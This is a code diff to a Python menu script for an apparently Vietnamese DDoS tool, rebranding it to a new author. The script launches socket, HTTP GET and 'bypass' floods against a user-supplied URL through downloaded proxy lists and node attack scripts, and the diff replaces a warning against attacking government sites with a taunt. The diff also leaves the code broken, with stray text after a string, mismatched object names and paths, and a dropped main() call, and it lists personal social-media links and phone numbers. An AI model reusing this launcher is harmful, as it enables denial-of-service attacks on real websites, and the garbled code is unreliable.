@@ -50,7 +50,7 @@ class Home:
 ♫╚╣║║║║╔╣ ║║ ║║║║║║♫║♫╗  
 ╚═╩═╩♫╩═╝ ╚╝ ╚═╝╚═╝╚══╝
    ♫ Lệnh " HELP " Để Xem All Lệnh ♫
-""")
+""") coder by Nguyễn Anh Tú </3
 		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" SOCKET FLOOD")
 		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" GET FLOOD")
 		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" BYPASS")
@@ -58,29 +58,29 @@ class Home:
 		print("\n")
 		http_proxy = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
 		while True:
-			sys.stdout.write(Color.LB+"📌 "+Color.LR+"["+Color.LG+"Vi Đức Hùng""]"+Color.LB+"\n➠ "+Color.RESET)
+			sys.stdout.write(Color.LB+"📌 "+Color.LR+"["+Color.LG+"Nguyễn Anh Tú""]"+Color.LB+"\n➠ "+Color.RESET)
 			option = input()
 			if option == '01' or option == '1':
 				try:
 					url = str(input(f"{Color.LG} ♫ Url: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} ♫ Time: "+Color.RESET))
 					reqs = int(input(f"{Color.LG} ♫ Reqs: "+Color.RESET))
-					VDH_TOOL.styleText(" Không Được DDoS Web Chính Phủ...\n")
+					Atu_TOOL.styleText(" Chờ Bố Đấm Ok...\n")
 					for i in range(150):
 						print (f"{Color.LG}Starting Attack To ➠ {Color.LG}" + url)
 						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
 						print (f"{Color.LY}Starting Attack To ➠ {Color.LY}" + url)
 						time.sleep(0.01)
-					with open("vdh/http.txt", 'w') as p:
+					with open("atu/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
-					subprocess.run([f'screen -dm node vdh/Method/socket {url} vdh/http.txt {floodtime} {reqs}'], shell=True)
+					subprocess.run([f'screen -dm node atu/Method/socket {url} vdh/http.txt {floodtime} {reqs}'], shell=True)
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option == '02' or option == '2':
 				try:
 					url = str(input(f"{Color.LG} ♫ Url: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} ♫ Time: "+Color.RESET))
-					VDH_TOOL.styleText(" Không Được DDoS Web Chính Phủ...\n")
+					Atu_TOOL.styleText(" Chờ Bố Đấm Ok...\n")
 					for i in range(10000):
 						print (f"{Color.LG}Starting Attack To ➠ {Color.LG}" + url)
 						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
@@ -88,20 +88,20 @@ class Home:
 						time.sleep(0.01)
 					with open("vdh/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
-					subprocess.run([f'screen -dm node vdh/Method/flood GET {url} vdh/http.txt {floodtime} 64 1'], shell=True)
+					subprocess.run([f'screen -dm node atu/Method/flood GET {url} vdh/http.txt {floodtime} 64 1'], shell=True)
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option == '03' or option == '3':
 				try:
 					url = str(input(f"{Color.LG} ♫ Url: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} ♫ Time: "+Color.RESET))
-					VDH_TOOL.styleText(" Không Được DDoS Web Chính Phủ...\n")
+					VDH_TOOL.styleText(" Chờ Bố Đấm Ok...\n")
 					for i in range(150):
 						print (f"{Color.LG}Starting Attack To ➠ {Color.LG}" + url)
 						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
 						print (f"{Color.LY}Starting Attack To ➠ {Color.LY}" + url)
 						time.sleep(0.01)
-					with open("vdh/http.txt", 'w') as p:
+					with open("atu/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
 					subprocess.run([f'screen -dm node vdh/Method/bypass {url} {floodtime}'], shell=True)
 				except:
@@ -109,7 +109,7 @@ class Home:
 			elif option == 'refresh' or option == 'REFRESH':
 				self.Method()
 			elif option == 'home' or option == 'HOME':
-				VDH_Tool.home()
+				Atu_Tool.home()
 			elif option == 'clean' or option == 'CLEAN':
 				os.system('CLEAN')
 				self.Method()
@@ -158,11 +158,10 @@ def spoof_useragents():
 
 def main():
 	
-	VDH_TOOL.home()
+	Atudz_TOOL.home()
 
 
 if __name__ == '__main__':
 	commands = f"""HOME: Quay Lại Trang Đầu\nREFRESH: Làm Mới Menu\nCLEAN: Xoá Tất Cả\nEXIT: Thoát\nSTOP: Ngừng DDoS\nCONTACT: Contact/Hỗ Trợ"""
-	contact = f"""Facebook: https://www.facebook.com/Users.ViDucHung.ProFile\nZalo: 0359822840"""
-	VDH_TOOL = Home(commands, contact)
-	main()
+	contact = f"""Facebook: https://www.facebook.com/ebeecuti208zzw\nZalo: 0386311853"""
+	Atu_TOOL = Home(commands, contact)
